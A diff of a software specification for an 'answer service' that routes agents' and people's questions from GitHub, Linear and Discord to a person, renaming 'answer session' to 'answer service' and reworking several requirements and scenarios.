@@ -1,11 +1,11 @@
 ## Purpose
 
-The answer session is the part of the inquisitor where a person answers
+The answer service is the part of the inquisitor where a person answers
 the questions asked of them, from the GitHub, Linear and Discord channels
-they subscribe to and from questions branches. This spec specifies the
-answer service: what the answer session does, never how its user
-interface looks or which keys it takes. The skill ships a reference UI, a
-Claude Code mod in the skill's `answer-ui/` folder. The mod runs beside
+they subscribe to and from questions branches. This spec specifies what
+the answer service does, never how its user interface looks or which keys
+it takes. The skill ships the answer mod, the answer service's reference
+UI: a Claude Code mod in the skill's `answer-mod/` folder. The mod runs beside
 its Claude Code session's conversation, in which the person discusses
 each question with the model. Only its screens go unspecified: they come
 from the approved prototype (task 6.1).
@@ -49,29 +49,28 @@ inquisitor's, or that spec's, *Title*:
 - **The picker** is Claude Code's question tool, `AskUserQuestion`.
 - A **capability decision record** is a repository's
   `openspec/specs/<capability>/decisions.md`, one per capability.
-- **The session's model** is the model of the Claude Code session the
-  answer session runs in, which judges questions and drafts replies.
+- **The service's model** is the model of the Claude Code session the
+  answer service runs in, which judges questions and drafts replies.
 - **Task 0.N** is that task in this change's tasks.md.
 - **What the question concerns**, **the repository the question
   concerns**, **the team's lore repository**, an **open-questions
   section** and **more visible** are as
-  the inquisitor's spec defines them, and the session's model judges what
+  the inquisitor's spec defines them, and the service's model judges what
   a question concerns as that spec has an agent judge it, except where a
   concerns line or *A channel's repositories place its questions* places
   it.
-- A message's **subscribers** are the people whose answer sessions
+- A message's **subscribers** are the people whose answer services
   subscribe to its channel.
-- A **discussion** is the person's exchange with the session's model about
+- A **discussion** is the person's exchange with the service's model about
   one question, and its **discussion record** the copy of both
   sides' messages kept in the state folder (*Local state is per machine,
   in the state folder*).
-- **The preview** is what the answer session shows the person before a
+- **The preview** is what the answer service shows the person before a
   post goes out or is edited: the exact post, where it will be recorded,
   and any warning.
-- A **thread copy** is a question the answer session reads from a
+- A **thread copy** is a question the answer service reads from a
   thread, whether it shows it, ignores it as not a question or passes it
-  over; a questions-branch log file **holds** it when the file's
-  `asked_in` links that thread message and, in a message split into items
+  over; a questions-branch log file **holds** it when two things are true. First, the file's `asked_in` links that thread message. Second, in a message split into items
   (*Each item of an open-questions section is its own question*), the
   file's question has the same hash as the item or, since the asking
   agent logs each sentence on its own, as any one of the sentences outside
@@ -79,7 +78,7 @@ inquisitor's, or that spec's, *Title*:
   (*Question sentences outside a message's list are one more question*; the inquisitor's *A question's text and hash are
   built one way*). A log file also holds a question shown from that file, and
   a **questions-branch question** is one that a log file holds. A
-  question has **no thread** on a machine whose answer session has read
+  question has **no thread** on a machine whose answer service has read
   no thread copy of it and so shows it from its log file alone, even
   where its `asked_in` links a thread.
 
@@ -90,12 +89,10 @@ a requirement before that one may already use the term.
 
 ### Requirement: Relay posts start with a reserved prefix
 
-The answer session SHALL count as a **relay post** only a message a relay
+The answer service SHALL count as a **relay post** only a message a relay
 identity posted that starts with one of the four **reserved prefixes**:
 `User says: `, `User asks: `, `Recorded answer: ` or `Inquisitor: `,
-which the skill's instructions reserve for its posts. On GitHub, this
-requirement and every other that task 0.21 lists wait for that task's
-result, and the three GitHub replies task 0.31 names wait for task
+which the skill's instructions reserve for its posts. On GitHub, this requirement and every other that task 0.21 lists wait for that task's result, its measure of how GitHub tells a bot's comment, and the three GitHub replies task 0.31 names wait for task
 0.31's too.
 
 #### Scenario: A prefixed post by a relay identity is a relay post
@@ -120,27 +117,27 @@ result, and the three GitHub replies task 0.31 names wait for task
 
 - **WHEN** an agent reads the skill's instructions on relay identities
 - **THEN** they say a relay identity may post for other work, but only
-  the answer session's posts use the reserved prefixes
+  the answer service's posts use the reserved prefixes
 
-### Requirement: An automatic post's text is fixed by the answer session
+### Requirement: An automatic post's text is fixed by the answer service
 
 An **automatic post** is a relay post starting `Recorded answer: ` or
-`Inquisitor: `, whose text the answer session SHALL fix, never the
+`Inquisitor: `, whose text the answer service SHALL fix, never the
 person, except the `Recorded in: ` URL the person gives in a filter 1
-reply. The answer session SHALL post an automatic post by itself only as
+reply. The answer service SHALL post an automatic post by itself only as
 *Filter 1 posts a recorded answer by itself in the question's thread* or
 *A clear filter 2 to 4 failure gets its fixed reply by itself* allows, and otherwise only
 once the person confirms.
 
 #### Scenario: An automatic post holds no words the person wrote
 
-- **WHEN** the answer session posts filter 4's reply by itself on an
+- **WHEN** the answer service posts filter 4's reply by itself on an
   agent's question
 - **THEN** the post is filter 4's fixed text, none of it the person's
 
 ### Requirement: A question's thread is where a reply to it goes
 
-The answer session SHALL treat as a question's **thread** the place a
+The answer service SHALL treat as a question's **thread** the place a
 reply to it goes: on GitHub, the conversation of the issue or pull request
 holding it, or the review thread for a review comment; on Linear, the
 comment thread of the comment, or the issue, holding it; on Discord, the
@@ -154,7 +151,7 @@ channel or thread holding it.
 
 ### Requirement: A relayed question is a person's question
 
-The answer session SHALL treat as a **relayed question** any question asked
+The answer service SHALL treat as a **relayed question** any question asked
 of the person in a message starting `User says: ` or `User asks: ` that a
 bot account posted on any surface, and SHALL count it as a person's
 question. It SHALL show the posting bot account's name as who the
@@ -171,13 +168,13 @@ question is from; the name proves nothing about who asked.
 
 - **WHEN** the App `maya-relay` posts a comment starting `User asks: `
   that tags the person
-- **THEN** the session shows the question as from `maya-relay`, and no
+- **THEN** the service shows the question as from `maya-relay`, and no
   check or record treats that name as proof of who asked
 
 ### Requirement: An agent's question comes from a bot account or a log file
 
 **The asker** is whoever asked the question: a person, or an agent such
-as an Igor's worker. Unless it is a relayed question, the answer session
+as an Igor's worker. Unless it is a relayed question, the answer service
 SHALL count as **an agent's question** a fourth-source log file (*A
 question asked of the person comes from one of four sources*) and a
 message by a bot account (a GitHub App, Linear app user, or Discord bot or
@@ -200,7 +197,7 @@ webhook). Every other question SHALL count as **a person's question**.
 **The queue** is this machine's list of unanswered questions, other than
 those closed (*A decline with nothing posted closes a thread copy on this
 machine only*) and those whose answer is on the pending list (*An answer
-that cannot reach its thread is kept pending*). The answer session SHALL
+that cannot reach its thread is kept pending*). The answer service SHALL
 order the questions not set aside by their asked times, oldest first,
 and then, in no order among themselves, those **set aside for later**:
 moved by the person to the queue's end on this machine.
@@ -219,8 +216,8 @@ moved by the person to the queue's end on this machine.
 
 ### Requirement: A question is asked when its message was posted or a poll first found it
 
-The answer session SHALL take as a question's **asked time** the time
-its service gives for posting the message the question is shown from.
+The answer service SHALL take as a question's **asked time** the time
+its surface gives for posting the message the question is shown from.
 For a review request, an assignment, or a questions-branch file shown as
 a question itself, not from the message its `asked_in` links, it SHALL
 take the time of the poll on this machine that first found it.
@@ -240,41 +237,40 @@ take the time of the poll on this machine that first found it.
 
 ### Requirement: The state folder is under the XDG state home
 
-The answer session's **state folder** SHALL be
-`${XDG_STATE_HOME:-$HOME/.local/state}/inquisitor/answer-session/`, with
-mode 0700, and every file the session writes in it, outside its git
+The answer service's **state folder** SHALL be
+`${XDG_STATE_HOME:-$HOME/.local/state}/inquisitor/answer-service/`, with
+mode 0700, and every file the service writes in it, outside its git
 clones, SHALL have mode 0600.
 
 #### Scenario: The state folder follows XDG_STATE_HOME
 
 - **WHEN** `XDG_STATE_HOME` is `/x/state`, or is not set
-- **THEN** the state folder is `/x/state/inquisitor/answer-session/`, or
-  `$HOME/.local/state/inquisitor/answer-session/`
+- **THEN** the state folder is `/x/state/inquisitor/answer-service/`, or
+  `$HOME/.local/state/inquisitor/answer-service/`
 
 #### Scenario: Only the person's user can read the state folder
 
-- **WHEN** the answer session saves a discussion record in the state
+- **WHEN** the answer service saves a discussion record in the state
   folder
 - **THEN** the folder has mode 0700 and the record mode 0600
 
 ### Requirement: A Linear or Discord question is placed by what it concerns
 
 For a Linear or Discord question that no concerns line settles and no
-mapped channel's default places, the session's model SHALL judge which
+mapped channel's default places, the service's model SHALL judge which
 subscribed repository it concerns or,
 for a collective's question, which configured lore repository serves it.
-Any question, on GitHub too, that `record_verdict`'s `place` puts in
-none of them, as `other` does, has **no place**: the session SHALL post nothing by itself
+Any question, on GitHub too, that the model's `place` verdict puts in none of them, as `other` does, has **no place**: the service SHALL post nothing by itself
 and, unless the person picks a place in the preview, relay their answer
 unrecorded.
 
 #### Scenario: A question with no place gets no automatic reply and no record
 
 - **WHEN** an agent's question tagging the person on Linear, in a team
-  that is not mapped, is a collective's question, the session's model cannot tell which of two configured
+  that is not mapped, is a collective's question, the service's model cannot tell which of two configured
   lore repositories serves it, and the person answers it, picking no
   place in the preview
-- **THEN** the session posted no reply by itself, the person was shown the
+- **THEN** the service posted no reply by itself, the person was shown the
   question, and the answer is relayed in its thread with no log file pushed
 
 ### Requirement: A channel's repositories place its questions
@@ -301,20 +297,20 @@ about another repository or collective SHALL take the model's `place`.
 
 ### Requirement: A Linear or Discord question in doubt gets no automatic reply
 
-The answer session SHALL post a reply by itself to a question asked on
-Linear or Discord that no concerns line settles only when the session's
+The answer service SHALL post a reply by itself to a question asked on
+Linear or Discord that no concerns line settles only when the service's
 model is sure of the place it picked, or the question took a mapped
 channel's default: its one repository or, for a question the model
 judges a collective's, its lore repository. When the model picked a place and is not sure of
-it, the session SHALL show the person the question, and the preview of
+it, the service SHALL show the person the question, and the preview of
 their answer shows that place.
 
 #### Scenario: A doubtful placement is shown to the person
 
 - **WHEN** an agent's question with no concerns line, in a Discord channel
   whose `repos` is `["o/web", "o/api"]`, has a recorded answer filter 1
-  finds, and the session's model picks `o/api` but is not sure
-- **THEN** the session posts no reply by itself and shows the person the
+  finds, and the service's model picks `o/api` but is not sure
+- **THEN** the service posts no reply by itself and shows the person the
   question, and the preview of their answer names the questions branch of
   `o/api`
 
@@ -333,16 +329,16 @@ it.
 
 - **WHEN** an agent's question in an `o/api` issue, followed by
   `Concerns: o/web`, clearly fails filter 4, the person subscribes to
-  `o/web` and has write access there, and the session's model would judge
+  `o/web` and has write access there, and the service's model would judge
   that the question concerns `o/api`
-- **THEN** the session posts filter 4's reply by itself, and pushes its
+- **THEN** the service posts filter 4's reply by itself, and pushes its
   miss file to the questions branch of `o/web`
 
 #### Scenario: A collective's line names its lore repository
 
 - **WHEN** an agent's Discord question about the organization is followed
   by `Concerns: lore o/team-lore`, a configured lore repository, and the
-  session's model would pick the configured lore repository `o/lore`
+  service's model would pick the configured lore repository `o/lore`
 - **THEN** the question is the collective's that `o/team-lore` serves,
   and its miss file goes to the questions branch of `o/team-lore`
 
@@ -352,7 +348,7 @@ it.
   no subscription covers, by `Concerns: lore o/other`, which the
   configuration does not list, or by a line naming a place where the
   person's permission is below write or cannot be read
-- **THEN** the session's model judges what the question concerns, and
+- **THEN** the service's model judges what the question concerns, and
   posts no `Inquisitor: ` reply by itself, since the asking agent looks for
   a reply's miss file only on the branch a concerns line names
 
@@ -362,15 +358,13 @@ it.
   both outside any open-questions section, one followed by
   `Concerns: o/web` and the other by `Concerns: o/api`
 - **THEN** no concerns line settles the question the two sentences make,
-  and the session posts no `Inquisitor: ` reply to it by itself
+  and the service posts no `Inquisitor: ` reply to it by itself
 
 ### Requirement: A decline's preview says when the asking agent takes its reply as input
 
 When the person declines an agent's question for the inquisitor with
-filter 2, 3 or 4 and no miss file will back the reply, the decline's preview SHALL say that the
-asking agent will take the reply as input. No miss file backs it when no
-concerns line settles the question, or when the session writes none: for files whose `repository` keys
-differ, by *A miss holds the repository its question concerns*, by *The answer session
+filter 2, 3 or 4 and no miss file will back the reply, the preview SHALL say the asking agent will take the reply as input. No miss file backs it when no
+concerns line settles the question, or when the service writes none: for shown files whose `repository` keys differ, by *A miss holds the repository its question concerns*, by *The answer service
 writes no miss it cannot place privately*, or with no login configured.
 
 #### Scenario: A decline's preview says an unsettled question's reply is input
@@ -384,7 +378,7 @@ writes no miss it cannot place privately*, or with no login configured.
 
 ### Requirement: Each item of an open-questions section is its own question
 
-The answer session SHALL treat each item of an open-questions section in
+The answer service SHALL treat each item of an open-questions section in
 a GitHub issue or pull request description, comment or review, whoever
 wrote it, since an agent may post on GitHub under its person's login, or
 in a bot account's Linear or Discord message, as its own question,
@@ -407,7 +401,7 @@ Any other message SHALL be one question, whose relay posts name no item.
 
 - **WHEN** an agent's comment asks two things in two sentences ending in
   `?`, with no open-questions section
-- **THEN** the answer session shows it as one question, though the
+- **THEN** the answer service shows it as one question, though the
   asking agent's first call of the inquisitor script counts each sentence, and a relay post about it
   holds no number
 - **AND** when the person's answer to it begins `question 2: `, the relay
@@ -420,7 +414,7 @@ Any other message SHALL be one question, whose relay posts name no item.
 - **WHEN** an Igor's Linear handback lists two questions under `Open
   questions:`, each with a tag line mentioning the person and logged in
   its own file whose `asked_in` links the handback
-- **THEN** the answer session shows them as questions 1 and 2, each
+- **THEN** the answer service shows them as questions 1 and 2, each
   question's hash leaving its tag line out, so that its file holds it,
   and a relay post answering the second holds `question 2: `
 
@@ -438,7 +432,7 @@ it.
 - **WHEN** an agent's comment tagging the person lists two items under
   "Not in this change", then one under "Open questions" followed by a
   concerns line that settles it
-- **THEN** the answer session shows only the last item, as question 3,
+- **THEN** the answer service shows only the last item, as question 3,
   and posts no `Inquisitor: ` reply to either deferred item
 
 ### Requirement: Question sentences outside a message's list are one more question
@@ -451,30 +445,30 @@ after the section's items, so none is dropped.
 
 - **WHEN** an agent's comment lists two questions in its open-questions
   section and asks a third in a sentence ending in `?` above it
-- **THEN** the answer session shows three questions, the sentence as
+- **THEN** the answer service shows three questions, the sentence as
   question 3, and a relay post answering it holds `question 3: `
 
-### Requirement: The answer session's configuration is a section of the inquisitor's configuration
+### Requirement: The answer service's configuration is a section of the inquisitor's configuration
 
-The answer session SHALL read, of `inquisitor.json`, only the top-level
-`login` and `lore` and the `answer_session` section. That section holds
+The answer service SHALL read, of `inquisitor.json`, only the top-level
+`login` and `lore` and the `answer_service` section. That section holds
 an object per **surface** used, `github`, `linear` or `discord`, naming
 its relay identity, its **channels** (the person's subscriptions there, a
 Discord channel with its threads) and, on Discord only, the person's user
 id. The file SHALL hold no token or key, the Linear key staying in the
 keychain, and a save SHALL keep keys it does not write.
 
-#### Scenario: The answer session reads only its keys of the configuration
+#### Scenario: The answer service reads only its keys of the configuration
 
 - **WHEN** `inquisitor.json` holds, beside `login`, `lore` and
-  `answer_session`, another top-level key
-- **THEN** the answer session reads nothing from that key, and a save
+  `answer_service`, another top-level key
+- **THEN** the answer service reads nothing from that key, and a save
   keeps it unchanged
 
 #### Scenario: Each surface's object names its relay identity and channels
 
 - **WHEN** `~/.config/shared-skills/inquisitor.json` holds `login`, `lore`
-  and an `answer_session` key with a `github`, a `linear` and a `discord`
+  and an `answer_service` key with a `github`, a `linear` and a `discord`
   object
 - **THEN** each object's `relay` names the surface's relay identity, by
   the name its skill, github-app, linear-app or discord-bot, takes with
@@ -493,15 +487,15 @@ keychain, and a save SHALL keep keys it does not write.
 - **WHEN** setup saves a Linear subscription
 - **THEN** `inquisitor.json` holds the team key and the relay's identity
   name, and no token: linear-app holds the relay's token; the person's Linear
-  API key, which the answer session reads Linear with, is only in the
+  API key, which the answer service reads Linear with, is only in the
   system keychain
 
-### Requirement: The person runs the session, and a relay identity posts for them
+### Requirement: The person runs the service, and a relay identity posts for them
 
-**The person** SHALL be the one whose questions the answer session shows:
+**The person** SHALL be the one whose questions the answer service shows:
 the one running it, whose login is the one the inquisitor's *A configured
 login counts only when gh is logged in as it* sets; with no login
-configured, GitHub SHALL be off and the session SHALL record nothing and post no reply by itself,
+configured, GitHub SHALL be off and the service SHALL record nothing and post no reply by itself,
 telling the person why. A **relay identity** SHALL be the bot of
 a surface's skill, github-app, linear-app or discord-bot, that posts for
 the person there, with a token that skill holds.
@@ -510,16 +504,16 @@ the person there, with a token that skill holds.
 
 - **WHEN** `inquisitor.json` names the login `adamstallard` but `gh` is
   logged in as another account
-- **THEN** the answer session reads no GitHub channel and posts nothing on
+- **THEN** the answer service reads no GitHub channel and posts nothing on
   GitHub
 - **AND** it pushes no answer, miss or handled file, hash-only or not,
   and posts no reply by itself, and each preview says the record needs
   the person's GitHub login
 
-#### Scenario: No answer-session file holds a relay identity's token
+#### Scenario: No answer-service file holds a relay identity's token
 
-- **WHEN** the answer session posts a relay post on Discord
-- **THEN** discord-bot posts it with the token it holds, and none of the files the answer session writes holds that token
+- **WHEN** the answer service posts a relay post on Discord
+- **THEN** discord-bot posts it with the token it holds, and none of the files the answer service writes holds that token
 
 ### Requirement: Setup checks each relay identity before its channels are used
 
@@ -538,15 +532,13 @@ and unrun checks.
   `memberSearch`, whether the bot may look up members to mention them, as
   `false`, and every other check passes
 - **THEN** setup counts the Discord relay's check as passed
-- **AND** each later Discord relay post leaves every `@name` plain text,
-  and the person is shown one warning for that post
 
 #### Scenario: A channel the relay cannot post in is off alone
 
 - **WHEN** setup finds that the Discord relay cannot post in one of two
   subscribed Discord channels, and can post in the other
 - **THEN** setup shows the failure and its fix, saves both channels, and
-  the answer session reads and posts in the other channel only
+  the answer service reads and posts in the other channel only
 
 #### Scenario: A failed identity check turns off its whole surface
 
@@ -578,12 +570,12 @@ and unrun checks.
 
 - **WHEN** a Discord channel is off because its posting check failed, and
   at the next opening that check passes
-- **THEN** the channel is on, and the answer session reads and posts in it
+- **THEN** the channel is on, and the answer service reads and posts in it
 
 ### Requirement: Setup opens on an incomplete configuration
 
-The answer session SHALL run setup in place of the queue while `login` or
-`answer_session` is missing or no surface in it has both a `relay` and a
+The answer service SHALL run setup in place of the queue while `login` or
+`answer_service` is missing or no surface in it has both a `relay` and a
 subscription, and when the person asks for it. Setup SHALL not complete without
 the person's GitHub login, and SHALL offer the channels the person can
 read and save every channel the person chose, whatever its checks found.
@@ -598,8 +590,8 @@ read and save every channel the person chose, whatever its checks found.
 
 #### Scenario: Setup opens in place of the queue on an incomplete configuration
 
-- **WHEN** the person opens the answer session and `inquisitor.json` has no
-  `login`, no `answer_session` section, or one in which no surface has
+- **WHEN** the person opens the answer service and `inquisitor.json` has no
+  `login`, no `answer_service` section, or one in which no surface has
   both a `relay` and a subscription
 - **THEN** setup runs in place of the queue
 
@@ -612,7 +604,7 @@ read and save every channel the person chose, whatever its checks found.
 
 #### Scenario: Setup runs again on request
 
-- **WHEN** the person asks for setup in an answer session with the
+- **WHEN** the person asks for setup in an answer service with the
   configuration complete
 - **THEN** setup runs, showing the saved subscriptions as chosen
 
@@ -731,39 +723,37 @@ Repository questions SHALL need no lore repository and no igor.
 - **WHEN** the person skips the step, and answers a question about `o/api`
 - **THEN** the answer is recorded on the questions branch of `o/api`
 
-### Requirement: Only a session with the answer marker opens an answer session
+### Requirement: Only a session with the answer marker opens the answer service
 
-The reference UI SHALL open the answer session by itself whenever a Claude
+The answer mod SHALL open the answer service by itself whenever a Claude
 Code session whose environment holds `INQUISITOR_ANSWER=1`, the marker
-the `answer` command sets, starts or resumes, unless another session holds the lock (*One answer session runs on each machine*), and in no other session.
+the `answer` command sets, starts or resumes, unless another session holds the lock (*One answer service runs on each machine*), and in no other session.
 
-#### Scenario: Running answer opens the answer session
+#### Scenario: Running answer opens the answer service
 
 - **WHEN** the person runs `answer`
-- **THEN** a session named `Answers` starts, and the answer session opens
+- **THEN** a session named `Answers` starts, and the answer service opens
   in it with no prompt typed
 
-#### Scenario: Resuming the session reopens the answer session
+#### Scenario: Resuming the session reopens the answer service
 
 - **WHEN** the person resumes a session `answer` started
-- **THEN** the answer session opens in it again
+- **THEN** the answer service opens in it again
 
-#### Scenario: Another session opens no answer session
+#### Scenario: Another session opens no answer service
 
 - **WHEN** a Claude Code session with the inquisitor skill starts or
   resumes without `INQUISITOR_ANSWER=1` in its environment
-- **THEN** no answer session opens
+- **THEN** no answer service opens
 
-### Requirement: The script installs the reference UI
+### Requirement: The script installs the answer mod
 
-The script's `install-ui` command SHALL link
-`~/.claude/skills/inquisitor-answer-ui`, where manage-skills also links
-mods for Claude Code to load, to
-the skill's `answer-ui/` folder, and `~/.local/bin/answer` to that folder's
-`answer` launcher, which starts the restricted session named `Answers`
-that the first scenario gives; leave alone,
+The script's `install-mod` command SHALL link
+`~/.claude/skills/inquisitor-answer-mod`, where Claude Code loads mods from, to
+the skill's `answer-mod/` folder, and `~/.local/bin/answer` to that folder's
+`answer` launcher, which starts the restricted session named `Answers` that the first scenario below gives; leave alone,
 saying so, anything else at either path; and say when `~/.local/bin` is not on `PATH`. Its
-`uninstall-ui` command SHALL remove only those links.
+`uninstall-mod` command SHALL remove only those links.
 
 #### Scenario: The answer launcher starts a restricted session
 
@@ -772,29 +762,29 @@ saying so, anything else at either path; and say when `~/.local/bin` is not on `
   in the fullscreen layout `CLAUDE_CODE_NO_FLICKER=1` sets, with the startup option that restricts the
   session's tools, which task 0.34 is to find
 
-#### Scenario: The script installs the reference UI
+#### Scenario: The script installs the answer mod
 
-- **WHEN** `install-ui` runs with nothing at either path, and `~/.local/bin` is
+- **WHEN** `install-mod` runs with nothing at either path, and `~/.local/bin` is
   not on the person's `PATH`
-- **THEN** both links point into the skill's checked-in `answer-ui/`
+- **THEN** both links point into the skill's checked-in `answer-mod/`
   folder, and it says
   `~/.local/bin` is not on `PATH`
 
 #### Scenario: The script leaves another answer command alone
 
 - **WHEN** `~/.local/bin/answer` is a file of the person's own
-- **THEN** `install-ui` leaves it unchanged, and says `answer` was not
+- **THEN** `install-mod` leaves it unchanged, and says `answer` was not
   installed
 
 #### Scenario: Uninstalling removes only the script's links
 
-- **WHEN** `uninstall-ui` runs, with `~/.local/bin/answer` a file of the
+- **WHEN** `uninstall-mod` runs, with `~/.local/bin/answer` a file of the
   person's own and the mod's link in place
 - **THEN** the mod's link goes, and the file stays
 
 ### Requirement: A question asked of the person comes from one of four sources
 
-The answer session SHALL show as questions asked of the person only these,
+The answer service SHALL show as questions asked of the person only these,
 when unanswered:
 
 1. a message in a subscribed channel that reaches the person by *Whom a
@@ -809,13 +799,13 @@ when unanswered:
 
 - **WHEN** an agent posts, in a subscribed repository, a question tagging
   `@adamstallard`, the configured login
-- **THEN** the answer session shows it as a question asked of the person
+- **THEN** the answer service shows it as a question asked of the person
 
 #### Scenario: A message mentioning only the relay is a question
 
 - **WHEN** a message in a subscribed channel mentions the person's relay
   identity and not the person
-- **THEN** the answer session shows it as a question asked of the person
+- **THEN** the answer service shows it as a question asked of the person
 
 #### Scenario: An assigned issue or a review request is a question
 
@@ -860,7 +850,7 @@ than the person's relays posts starting `User says: `.
   after it in the same Linear comment thread, or replies to it in a
   GitHub review thread, or the asker comments next in the GitHub issue or
   pull request conversation
-- **THEN** the answer session shows each as a question asked of the
+- **THEN** the answer service shows each as a question asked of the
   person
 
 #### Scenario: Only the asker's next comment replies in a GitHub conversation
@@ -869,7 +859,7 @@ than the person's relays posts starting `User says: `.
   person comments, then the asker comments twice
 - **THEN** only the asker's first comment after the relay post counts as
   replying to it
-- **AND** when the asker answers in their own answer session instead of
+- **AND** when the asker answers in their own answer service instead of
   commenting, the `User says: ` comment their relay posts counts
 - **AND** when the person's own relay posts a `User says: ` answer to
   another question there first, that post does not count, and the
@@ -877,7 +867,7 @@ than the person's relays posts starting `User says: `.
 
 ### Requirement: Messages judged clearly not questions are ignored
 
-The answer session SHALL ignore a message of sources 1 or 2 (*A question
+The answer service SHALL ignore a message of sources 1 or 2 (*A question
 asked of the person comes from one of four sources*), or a handback, that
 its model judges clearly not a question: it shows it nowhere, posts
 nothing on it and closes nothing. An unclear one SHALL be shown. The
@@ -915,7 +905,7 @@ reach each person it mentions.
 
 - **WHEN** an Igor's handback on an issue assigned to the person mentions
   `@maya` first and then the person
-- **THEN** the person's answer session does not show it, and Maya's does,
+- **THEN** the person's answer service does not show it, and Maya's does,
   if she subscribes to that repository
 
 #### Scenario: A bot's message that mentions no one reaches whoever can decide it
@@ -923,14 +913,14 @@ reach each person it mentions.
 - **WHEN** an agent's bot account asks, in an `o/web` issue, a question
   about `o/web` that mentions no one, and the person and Maya subscribe
   to `o/web`, the person with write access there and Maya without
-- **THEN** the person's answer session shows it, and Maya's does not
+- **THEN** the person's answer service shows it, and Maya's does not
 - **AND** one in a Linear team mapped to no repository, which the
-  session's model places `other`, reaches no answer session
+  service's model places `other`, reaches no answer service
 
 #### Scenario: A person's message reaches everyone it mentions
 
 - **WHEN** a person's comment mentions `@maya` and then the person
-- **THEN** the person's answer session shows it as a question
+- **THEN** the person's answer service shows it as a question
 
 ### Requirement: Each item of a bot's message reaches the person its tag line mentions
 
@@ -947,7 +937,7 @@ one SHALL reach whom its message would reach if it mentioned no one.
 - **WHEN** an agent's bot account posts two questions in one
   open-questions section, item 1 with the tag line `@maya` and item 2
   with the tag line naming the person
-- **THEN** the person's answer session shows item 2 and not item 1, and
+- **THEN** the person's answer service shows item 2 and not item 1, and
   Maya's shows item 1, if she subscribes to that repository
 - **AND** a question sentence outside the section, with the tag line
   naming the person, reaches the person and not Maya
@@ -968,20 +958,20 @@ relay post usually mentions no one.
 
 - **WHEN** an agent's bot account replies to the person's relay post with
   a question that mentions no one
-- **THEN** the person's answer session shows it as a question
+- **THEN** the person's answer service shows it as a question
 
 #### Scenario: A bot's reply to a relay post mentioning Maya first reaches Maya
 
 - **WHEN** an agent's bot account replies to the person's relay post with
   a question that mentions `@maya` first
-- **THEN** the person's answer session does not show it, and Maya's does,
+- **THEN** the person's answer service does not show it, and Maya's does,
   if she subscribes to that repository
 
 #### Scenario: A bot's message mentioning the relay first reaches the relay's person
 
 - **WHEN** an agent's bot account posts a question mentioning the
   person's relay identity first and then `@maya`
-- **THEN** the person's answer session shows it, and Maya's does not
+- **THEN** the person's answer service shows it, and Maya's does not
 
 ### Requirement: A mention names a user outside code, quotes and links
 
@@ -1001,7 +991,7 @@ team mention counts as none. This rule is built on Linear only once task
 
 ### Requirement: A handback is an Igor's comment holding igor's marker
 
-The answer session SHALL count as a **handback** only a comment that an
+The answer service SHALL count as a **handback** only a comment that an
 Igor wrote (on GitHub, an App whose slug starts with `igor-`; on Linear,
 an app user task 0.38 shows to be an Igor's) and that holds igor's
 handback marker, which quoted text cannot produce, in the form task 0.6
@@ -1012,7 +1002,7 @@ result.
 
 - **WHEN** an Igor posts, on an issue assigned to the person, a comment
   without the handback marker, after a handback no relay post names
-- **THEN** the answer session still shows the earlier handback, and does
+- **THEN** the answer service still shows the earlier handback, and does
   not treat the new comment as one
 
 #### Scenario: An Igor's marked Linear comment is a handback
@@ -1020,7 +1010,7 @@ result.
 - **WHEN** an Igor's Linear app user comments, on an issue in a
   subscribed team assigned to the person, holding igor's handback marker
   and mentioning no one
-- **THEN** the answer session shows it as that issue's handback, reaching
+- **THEN** the answer service shows it as that issue's handback, reaching
   the person as the assignee
 
 #### Scenario: Another App's marked comment is not a handback
@@ -1044,7 +1034,7 @@ them, and never shows them again, even once the newest is answered.
 
 - **WHEN** an issue assigned to the person holds an Igor's handback no
   relay post names, and the Igor posts a newer handback on it
-- **THEN** every answer session shows only the newer handback, never shows
+- **THEN** every answer service shows only the newer handback, never shows
   the older one's log file again, and an answer to the newer names only
   the newer one's log file
 
@@ -1087,27 +1077,27 @@ says, igor #229 setting the order an Igor mentions people in.
 
 - **WHEN** an Igor's handback that mentions no one is on an issue or a
   pull request assigned to the person
-- **THEN** it reaches the person's answer session under the third source
+- **THEN** it reaches the person's answer service under the third source
 
 #### Scenario: An Igor log file on someone else's item is not shown
 
 - **WHEN** an Igor's log file links a handback comment that mentions no
   one, on an issue assigned to someone else
-- **THEN** this person's answer session shows neither the issue nor the
+- **THEN** this person's answer service shows neither the issue nor the
   log file
 
 #### Scenario: An Igor log file on an unassigned item is shown to no one
 
 - **WHEN** an Igor's log file links a handback that mentions no one, on
   an issue no one is assigned
-- **THEN** no answer session shows the handback or its log file until
+- **THEN** no answer service shows the handback or its log file until
   someone is assigned the issue, and then only the assignee's
 
 ### Requirement: A log file follows the thread message its asked_in links
 
 A log file that holds a thread copy of a message this machine's polls
 have read SHALL follow that thread copy, taking whatever the answer
-session decides about it, and is never shown on its own; an Igor's log
+service decides about it, and is never shown on its own; an Igor's log
 file instead follows its handback comment, as *An Igor's log file follows
 its own handback comment* says.
 
@@ -1138,7 +1128,7 @@ have read SHALL be judged on its own, as a question of the fourth
 source, a questions-branch log file, save that an Igor's log file
 follows its handback comment as *An Igor's log file follows its own
 handback comment* says. The answer
-session SHALL NOT pair a file with a message by matching text.
+service SHALL NOT pair a file with a message by matching text.
 
 #### Scenario: A log file linking a message this machine has not read is shown on its own
 
@@ -1152,7 +1142,7 @@ session SHALL NOT pair a file with a message by matching text.
 #### Scenario: A log file with no asked_in is shown on its own
 
 - **WHEN** a lore repository holds an unanswered log file with no
-  `asked_in`, whose question tags `@adamstallard`, this session's person,
+  `asked_in`, whose question tags `@adamstallard`, the person running this service,
   and a comment in an issue this machine polled asks the same question in
   the same words
 - **THEN** the log file and the message are shown as two questions, and
@@ -1173,7 +1163,7 @@ item, the file is judged on its own.
 - **WHEN** an Igor's log file's `asked_in` is the URL of its
   handback comment on an issue assigned to the person, and the person
   answers that handback
-- **THEN** the answer session relays the answer on the issue and pushes
+- **THEN** the answer service relays the answer on the issue and pushes
   an answer file naming the log file
 
 #### Scenario: A later Igor question on an answered item follows its handback comment
@@ -1190,7 +1180,7 @@ item, the file is judged on its own.
 - **WHEN** an Igor's log file has `repository: o/api` and `asked_from:
   o/web`, and its `asked_in` links a handback on an issue in `o/web`, a
   subscribed repository
-- **THEN** the answer session follows the link, and an answer to that
+- **THEN** the answer service follows the link, and an answer to that
   handback names the log file
 - **AND** a log file with `asked_from: o/web` whose `asked_in` links a
   handback on an issue in the subscribed `o/api` is judged on its own,
@@ -1202,7 +1192,7 @@ item, the file is judged on its own.
   handback comment on a Linear issue in a subscribed team, and sits on a
   private repository's questions branch, the only kind a Linear
   `asked_in` may be written on, and the person answers that handback
-- **THEN** the answer session relays the answer on the Linear issue and
